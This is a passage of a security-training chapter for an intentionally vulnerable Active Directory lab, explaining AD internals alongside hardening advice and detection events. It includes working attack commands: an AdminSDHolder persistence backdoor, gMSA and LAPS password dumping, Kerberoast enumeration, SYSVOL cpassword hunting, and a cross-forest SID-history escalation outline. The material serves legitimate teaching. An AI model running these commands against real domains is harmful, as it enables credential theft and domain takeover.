- **Trusts** — every trust the forest has (in `CN=Partitions`).
- **NTDS Settings (per DC)** — DC list, options, replication topology.
- **Services** — registered services like Certificate Services (`CN=Public Key Services`).
- **DisplaySpecifiers** — UI hints, often referenced when planning attack messaging.

`CN=Public Key Services,CN=Services,CN=Configuration,...` houses the PKI surface:

- `CN=Certificate Templates,...` — every published template.
- `CN=Enrollment Services,...` — every CA's enrollment information.
- `CN=AIA,...` — Authority Information Access certs.
- `CN=CDP,...` — CRL Distribution Points.
- `CN=NTAuthCertificates` — the trust list of CAs that may issue authentication certs.

`certipy find` reads all of this with minimal auth and gives you a beautiful report — the canonical first step of any ADCS audit (ENUM-009). Chapter 06 will cover ADCS in full.

---

## 4.15 Built-in groups (privileged, in order of nastiness)

| Group | RID | What rights |
|---|---|---|
| **Enterprise Admins** | 519 (forest root only) | Admin in every domain in the forest |
| **Schema Admins** | 518 (forest root only) | Modify the schema (forest-wide, irreversible) |
| **Domain Admins** | 512 | Admin on every domain-joined machine, all DCs |
| **Administrators (BUILTIN)** | local-544 | Admin on the DC (members of DA/EA inherit) |
| **Account Operators** | local-548 | Create/modify users (not DA/EA/admins) — PE-016 |
| **Server Operators** | local-549 | Manage servers — backup, shutdown, mount disks; modify services — PE-029 |
| **Backup Operators** | local-551 | SeBackupPrivilege/SeRestorePrivilege — can dump NTDS.dit — PE-027 |
| **Print Operators** | local-550 | Manage printers — load arbitrary drivers — PrintNightmare — PE-031 |
| **DnsAdmins** | (varies) | Manage DNS — ServerLevelPluginDll DLL load as SYSTEM — PE-014 |
| **Group Policy Creator Owners** | 520 | Create new GPOs (NOT existing ones; you must link them) |
| **DHCP Administrators** | (varies) | Manage DHCP — sometimes path to network MITM |
| **Protected Users** | 525 | Members subject to extra Kerberos hardening: RC4 disabled, NTLM disabled, no caching, no delegation |

DVAD intentionally populates Backup/Server/Print Operators with low-priv users so you can practice PE-* against the DC. The lab also adds `alice` (or a similar user) to `DnsAdmins` as a privesc gateway.

### Protected Users — defenders' antidote

`Protected Users` members:

- Cannot authenticate via NTLM.
- Cannot use Kerberos RC4 (must use AES).
- Cannot be delegated (unconstrained or constrained).
- TGTs limit to 4 hours, no renewal.
- DPAPI master keys not cached.

Use it for every administrative account. DVAD does not add its admins to Protected Users so all the attacks remain practiceable.

---

## 4.16 AdminSDHolder and SDProp

`CN=AdminSDHolder,CN=System,DC=corp,DC=local` is a special object whose **security descriptor is periodically (every 60 min by default) copied** to every protected group member and every protected group itself. Protected groups include Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators, Server Operators, Print Operators, Replicator, Domain Controllers, Read-only Domain Controllers, Cert Publishers (Server 2012+), and the krbtgt account.

The mechanism is **SDProp**, run by the **PDC Emulator** every 60 minutes. Configurable via `AdminSDProtectFrequency` (in seconds) DWORD under `HKLM\SYSTEM\CCS\Services\NTDS\Parameters` — but most orgs leave the default.

The list of protected groups is encoded in `CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,...` in the `dsHeuristics` attribute (bit positions 4 and 16 toggle the per-group inclusion).

### Why attackers love it

Edit AdminSDHolder's DACL to grant your account `GenericAll`. Within 60 minutes, every protected account in the domain (including DA accounts) has GenericAll granted to you. Now you can reset their passwords, set SPNs, modify them — domain admin via patience.

```bash
# Add ACE to AdminSDHolder (requires GenericWrite on AdminSDHolder; you might get that as a junior helpdesk admin)
dacledit -principal alice -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
   -action write -rights FullControl corp.local/alice:'DVADlab2024!'

# Wait 60 minutes, or trigger SDProp manually if you somehow have rights
PS> Set-ItemProperty 'HKLM:\SYSTEM\CCS\Services\NTDS\Parameters' RunProtectAdminGroupsTask 1

# Then enjoy GenericAll on Administrator
```

This is `PER-014` in DVAD. Detection: 5136 (DS object modified) on AdminSDHolder, plus 4780 (SDProp run, reset DACL on protected account).

---

## 4.17 The KDC and krbtgt

Every domain has an account named `krbtgt`. Its password is **the master key to the domain's Kerberos.** When you forge a Golden Ticket, you encrypt it with krbtgt's NT hash (or AES-256 key for AES tickets, which is computed as PBKDF2 of password + salt).

`krbtgt`:
- RID 502.
- Disabled (`UAC=ACCOUNTDISABLE`, cannot log in interactively).
- Password rotates only when an admin explicitly runs `Reset-KrbtgtPassword` (or by automation). Many orgs never have.
- **DVAD sets it to `KrbtgtDVAD2024!`** for deterministic Golden Ticket creation.

To rotate properly you must do it **twice**, with a gap longer than max ticket age (default 10 hours), because Kerberos remembers the *previous* key (`oldUnicodePwd`) to accept tickets issued under the old key while they're in flight.

```
PS> Import-Module ActiveDirectory
PS> Get-ADUser krbtgt -Properties pwdLastSet | Select pwdLastSet
# If pwdLastSet is years ago, the domain is wide open to lingering Golden Tickets
```

### Read-only Domain Controllers (RODCs)

RODCs have their own krbtgt-equivalent account (`krbtgt_<RODC-id>$`) with a separate key. Selective password replication means a stolen RODC compromises only the passwords replicated to it. They are designed for branch offices with poor physical security. None in DVAD.

---

## 4.18 Machine accounts and gMSAs

Every domain-joined computer has a corresponding machine account in AD: `WS01$`, `DC01$`, `FILE01$`. Suffix `$` distinguishes from user. The password is a 240-character random string rotated by the host every 30 days (`MaximumPasswordAge` for computer secret defaults). The NT hash and AES keys are used for Kerberos service ticket encryption against the host's services.

Salt for AES key derivation:

```
salt = <DOMAIN>host<hostname>.<domain>      lowercased
key  = PBKDF2(password, salt, 4096, 32)     for AES256-CTS-HMAC-SHA1-96
```

### Group-Managed Service Accounts (gMSAs)

Special service accounts where the password is computed **deterministically** from a per-gMSA secret in AD called `msDS-ManagedPassword`. Only specific principals (the `msDS-GroupMSAMembership` attribute) can read it. The host computes the current 240-character password from the blob using `MSDS-ManagedPasswordId` and the current time epoch.

The blob format (`MSDS-MANAGEDPASSWORD_BLOB`):

```
struct {
    USHORT  Version;            // 1
    USHORT  Reserved;
    ULONG   Length;
    USHORT  CurrentPasswordOffset;
    USHORT  PreviousPasswordOffset;
    USHORT  QueryPasswordIntervalOffset;
    USHORT  UnchangedPasswordIntervalOffset;
    BYTE    CurrentPassword[256];
    ...
};
```

DVAD has a gMSA with overly permissive `msDS-GroupMSAMembership` so a regular user can read its blob via `gMSADumper.py`. That's `CRED-024`.

```bash
python3 gMSADumper.py -u alice -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
```

Output: NT hash of the gMSA's current password — pass-the-hash to wherever the gMSA can log in.

---

## 4.19 MachineAccountQuota

Per-domain quota: "how many machine accounts can a regular user create?" Stored as `ms-DS-MachineAccountQuota` on the domain root object. Default: **10**. Anyone who can authenticate can add 10 computers.

This single default is the foundation of:

- **noPac (CVE-2021-42278/42287).** Create a computer with a name matching a DC's sAMAccountName but without the `$` suffix, rename, then request tickets.
- **Certifried (CVE-2022-26923).** Create a computer with a `dNSHostName` matching a DC's, request a cert template that maps DNS → user.
- **Most RBCD exploits.** Need a controllable principal; the throwaway computer is it.

DVAD leaves it at default → `MachineAccountQuota=10` → CRED-019, PER-005, DF-003 all chain through it.

### How to query and set

```
PS> Get-ADObject "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota
PS> Set-ADObject "DC=corp,DC=local" -Replace @{ "ms-DS-MachineAccountQuota" = 0 }    # the fix
```

Setting to 0 stops the RBCD chain cold. DVAD does not set it.

---

## 4.20 Tombstones, recycle bin, replication minutiae

When you "delete" an AD object, it becomes a **tombstone** (`isDeleted=TRUE`) for **180 days** (default, configurable via `tombstoneLifetime` on `CN=Directory Service,...`). After that it's garbage-collected.

The **AD Recycle Bin** (enabled per forest via `Enable-ADOptionalFeature`) preserves more attributes during the tombstone window. Without it, restoring a tombstoned object loses most non-system attributes. Restoration is straightforward with `Restore-ADObject`.

```
PS> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
PS> Restore-ADObject -Identity '<DN>'
```

Implication: an attacker who "deletes" your high-value object can be undone — unless they wait 180 days, or they delete the recycle bin's parent containers (which requires forest-admin equivalence). Less relevant for DVAD operationally; recognise the concept.

### Replication metadata as forensic trail

`repadmin /showobjmeta` reveals per-attribute version history:

```
PS> repadmin /showobjmeta dc01.corp.local "CN=alice,CN=Users,DC=corp,DC=local"

Loc.USN  Originating DSA       Org.USN  Org.Time/Date       Ver Attribute
=======  =================     =======  ===================  === =========
   1234  Default-First-Site\DC01  1234  2026-01-15 09:12     1   objectClass
   5678  Default-First-Site\DC01  5678  2026-04-01 14:30     5   unicodePwd
   ...
```

A password change on `alice` increments her `unicodePwd` version. A forensic investigator can ask "when was Administrator's password last changed?" and learn whether an attacker reset it via DCSync. DCShadow attacks fake these metadata, which is part of why they evade naïve detection.

---

## 4.21 LDAP signing, channel binding, and bind types

LDAP supports three binds:

- **Anonymous** — no creds.
- **Simple** — username + password in cleartext.
- **SASL** — wrapped (GSSAPI/Kerberos, NTLM, SPNEGO, EXTERNAL/cert).

By default (older configurations), LDAP allowed:
- Simple binds over plaintext 389 → cleartext passwords on the wire.
- NTLM binds without channel binding → NTLM relay to LDAP (LDAPS or with extra tricks).

### Hardening (modern defaults from Server 2022+)

- **LDAP server signing required** (`HKLM\SYSTEM\CCS\Services\NTDS\Parameters\LDAPServerIntegrity=2`) — requires SASL integrity.
- **LDAP channel binding required** (`LdapEnforceChannelBinding=2`) — binds the LDAPS session to the TLS channel, defeating NTLM relay to LDAPS.

DVAD intentionally leaves these at lower levels (`LDAPServerIntegrity=1`, channel binding not enforced) so that NTLM relay to LDAP succeeds (IA-008 family, ADCS ESC8/ESC11).

---

## 4.22 DNS in AD — SRV records and dynamic updates

AD relies on DNS for **service location**. The KDC, LDAP, GC, and Kerberos password change services all have SRV records published under reserved names:

```
_ldap._tcp.dc._msdcs.corp.local       -> dc01.corp.local:389
_kerberos._tcp.dc._msdcs.corp.local   -> dc01.corp.local:88
_kerberos._udp.corp.local             -> dc01.corp.local:88
_kpasswd._tcp.corp.local              -> dc01.corp.local:464
_gc._tcp.corp.local                   -> dc01.corp.local:3268
_ldap._tcp.<sitename>._sites.dc._msdcs.corp.local
```

`dig SRV _ldap._tcp.dc._msdcs.corp.local @10.10.0.10` from Kali reveals the DC list.

Dynamic DNS updates: domain-joined hosts register their own A and PTR records at boot. The DC accepts the update if it has a valid Kerberos ticket. This is the **DNS spoofing** surface: any authenticated user can register arbitrary names (with default ACLs) — that's how mitm6 chains to "wpad.corp.local" hijacking (IA-007).

### DNS attacks worth knowing

- **`dnstool` / `krbrelayx`** — register a malicious A record for `wpad`.
- **AdiDNS** — AD-Integrated DNS lives in the directory; ACLs apply.
- **DNS RPC interface (MS-DNSP)** — DnsAdmins can `ServerLevelPluginDll` to load arbitrary DLLs as SYSTEM via the DNS service (PE-014).

---

## 4.23 LAPS — the local admin password solution

Two generations:

1. **Legacy LAPS** (CSE-based, Microsoft download from 2015). Stores password in `ms-Mcs-AdmPwd` and expiration in `ms-Mcs-AdmPwdExpirationTime`. ACL-controlled read.
2. **Windows LAPS** (built into Windows 11/Server 2022+, April 2023 update). Stores in `msLAPS-Password` (with optional encryption) and `msLAPS-EncryptedPassword`. Native LDAP integration.

ACL pattern: only specific principals get **AllExtendedRights** (which includes the ms-Mcs-AdmPwd reading right). A misconfigured ACL → any low-priv user reads the local admin password of any computer.

```bash
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --laps
```

DVAD seeds a misconfigured LAPS ACL on one OU — that's CRED-019.

---

## 4.24 Cross-forest paths in DVAD

To anchor the next chapters, this is what cross-forest looks like:

```
[ alice in corp.local (Domain User) ]
          |
          | (1) Land via initial access (IA-* family)
          v
[ alice in corp.local with creds ]
          |
          | (2) Privesc to DA in corp.local (PE-*, CRED-007 DCSync)
          v
[ Domain Admin in corp.local ]
          |
          | (3) Dump trust keys (lsadump::trust on dc01.corp.local)
          v
[ Have FINANCE\$$$ trust key ]
          |
          | (4) Forge inter-realm TGT for corp -> finance with SID history
          |     Targeting S-1-5-21-FINANCE-519 (Enterprise Admins of finance)
          v
[ Enterprise Admin in finance.local ]
          |
          | (5) Repeat for root.corp via the forest trust
          v
[ Enterprise Admin in root.corp ]
```

Each step is a distinct chapter — chapter 09 for IA, chapter 10 for CRED-007, chapter 11 for PE chains, chapter 12 for the trust-forge and SID-history injection. This chapter (04) sets every term used in the chain.

---

## Lab exercises

### Exercise 4.A — Enumerate the forest topology

From your attacker box:

```bash
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --query '(objectClass=trustedDomain)' '*'
```

You should see trust objects for `eu.corp.local` (parent-child), `finance.local` (external), and `root.corp` (forest).

Alternative with the AD module on a victim:

```
PS> Get-ADTrust -Filter * | Select Name,TrustType,TrustDirection,TrustAttributes,ForestTransitive,IntraForest
```

Note the `TrustAttributes` integer. Decode the bits using §4.4's table. Confirm SID filtering is *off* on the forest trust (`QUARANTINED_DOMAIN` bit 0x4 is clear).

### Exercise 4.B — Map FSMO roles

```
PS> netdom query fsmo
```

Identify the PDC Emulator. Note its IP. That's your ZeroLogon target (CRED-029 / similar).

### Exercise 4.C — Inspect AdminSDHolder DACL

```
PS> Get-DomainObjectAcl -SearchBase "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs |
       Select-Object IdentityReferenceName, ActiveDirectoryRights, ObjectAceType
```

Baseline: only built-in admins, SYSTEM, and "SELF" / "BUILTIN" should have anything beyond Read. Any other principal with WriteDacl or GenericAll is a planted backdoor (PER-014).

### Exercise 4.D — UAC bit query for AS-REP roastable users

```bash
ldapsearch -x -H ldap://10.10.0.10 -D 'alice@corp.local' -w 'DVADlab2024!' \
  -b 'DC=corp,DC=local' \
  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  samAccountName
```

Expect a small set of intentionally roastable accounts (`svc_legacy`, perhaps `helpdesk`).

### Exercise 4.E — Find SPNs

```bash
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
```

Gives you the list of kerberoastable users plus their SPNs. Don't crack yet — Chapter 10. Record output for the capstone.

### Exercise 4.F — Browse SYSVOL

```bash
smbclient -U 'alice%DVADlab2024!' //10.10.0.10/SYSVOL
smb: \> cd corp.local\Policies
smb: \> ls
smb: \> recurse on; prompt off; mget *
```

Inspect each GPO's contents:

```bash
grep -ri "cpassword" .
grep -ri "password" *.xml
```

CRED-006 is here.

### Exercise 4.G — Verify trust keys exist (read-only)

```
PS> Get-ADTrust -Filter * | Select Name,Source,Target,Direction,TrustType,TrustAttributes
```

Later (Chapter 12), you'll dump trust keys via `secretsdump --user-status` after compromising a DC.

### Exercise 4.H — Compute the EA SID of a foreign forest

```
PS> $eaSid = (Get-ADGroup "Enterprise Admins" -Server finance.local).SID.Value
PS> $eaSid    # e.g., S-1-5-21-1234567890-1234567890-1234567890-519
```

You'll need this exact SID for SID history injection in chapter 12 (DF-001 family).

### Exercise 4.I — Inspect MachineAccountQuota

```
PS> Get-ADObject "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota | Select ms-DS-MachineAccountQuota
```

Confirm it is 10. That's the precondition for everything in §4.12.3.

### Exercise 4.J — Confirm gMSA enumeration ACL

```
PS> $gmsa = Get-ADServiceAccount -Filter * -Properties msDS-GroupMSAMembership
PS> $gmsa.'msDS-GroupMSAMembership'
```

If the SD includes `Domain Users` or any low-priv group, that's CRED-024 setup.

---

## Self-check questions

1. What's the difference between a tree and a forest?
2. Which Naming Contexts are forest-wide vs domain-wide? Where does each get replicated?
3. What does the Global Catalog contain that is different from a full domain replica? What port serves it?
4. Why is Schema Admins more dangerous than Enterprise Admins? Why are schema changes "additive only"?
5. What does the PDC Emulator FSMO role do, and which two AD attacks target it specifically?
6. Why is DCSync possible even without admin rights, given the right ACE? Which two GUIDs identify the ACE?
7. What's the difference between an external trust and a forest trust? Which one supports transitivity?
8. What does SID filtering do, and why does DVAD disable it?
9. What is an SPN, why does Kerberoasting need one, and how do you abuse a `writeProperty servicePrincipalName` ACE?
10. What's the difference between constrained delegation with and without protocol transition? Which one is strictly more dangerous to compromise?
11. What is RBCD and what's the minimum precondition to abuse it? Why does setting `MachineAccountQuota=0` block it entirely?
12. What does AdminSDHolder do, how does SDProp propagate it, and how would you backdoor it?
13. What account is the master key to all of Kerberos in a domain, and why must `Reset-KrbtgtPassword` be run twice?
14. What is MachineAccountQuota and why does the default value of 10 matter so much?
15. Why does the PAC matter for ticket forgery? What did KB5020805 change?
16. Where does ADCS PKI metadata live, and why does `certipy find` work with just Domain User credentials?
17. What is the Protected Users group, and what hardenings does it enforce on members?
18. Explain why DVAD's three-forest topology is needed to teach the DF-* attack family.

---

## References

- **MS-ADTS** — Active Directory Technical Specification. Authoritative.
- **MS-DRSR** — Directory Replication Service Remote Protocol.
- **MS-PAC** — Privilege Attribute Certificate Data Structure.
- **MS-LSAD / MS-LSAT** — LSA RPC interfaces.
- **MS-SAMR** — SAM remote protocol.
- **Microsoft Docs — Active Directory Concepts:** https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/
- **Microsoft Docs — *Best Practices for Securing Active Directory*** — official hardening guide.
- **Microsoft Docs — *Five Common Mistakes That Allow Attackers to Compromise AD*** — blog summary of the misconfigs DVAD reproduces.
- **adsecurity.org** — Sean Metcalf's encyclopedia. Read the AD attack primer pieces; gold standard.
- **SpecterOps — *An ACE in the Hole*** — overview of ACL-based attacks.
- **harmj0y — *A Pentester's Guide to Group Scoping*** — corner case but worth knowing.
- **Elad Shamir — *Wagging the Dog*** — the original RBCD writeup.
- **SpecterOps — *Beyond the MCSE — Active Directory for the Security Professional*** — Sean Metcalf BlackHat talk.
- **Charlie Bromberg — *Kerberos delegation in Active Directory: a complete guide*** — exhaustive delegation reference.
- **Black Hat / DEF CON talks** — *DCShadow*, *Golden SAML*, *From Domain Admin to Enterprise Admin*, *Lethal Injection: Forest Trusts*.

Next: [05-authentication-protocols.md](05-authentication-protocols.md).
